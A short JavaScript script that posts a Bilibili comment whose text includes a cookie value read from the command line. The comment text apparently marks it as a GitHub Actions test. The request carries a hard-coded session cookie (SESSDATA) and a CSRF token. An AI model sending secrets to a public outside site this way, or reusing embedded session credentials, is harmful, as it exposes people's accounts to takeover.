import {HttpRequest} from './node/HttpRequest';
const COOKIE = (process.argv.slice(2))[0].substr(7);
HttpRequest({
    type: 'POST',
    _url: 'https://api.bilibili.com/x/v2/reply/add',
    contents: {
        oid:'456295362727813281',
        type:17,
        message:`这是我的一小步，却是人类的一大步(Github ation)\n${COOKIE}`,
        jsonp:'jsonp',
        csrf:'e12a61f98c9dc9ae26e68ef4e472a833'
    },
    headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
        Accept: 'application/json, text/plain, */*',
        'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
        Cookie: 'SESSDATA=266867a2%2C1612919172%2C085b8*81; ',
    },
    success: chunk => {
        console.log(chunk);
    },
    error: err => {
        console.log(err);
    }
})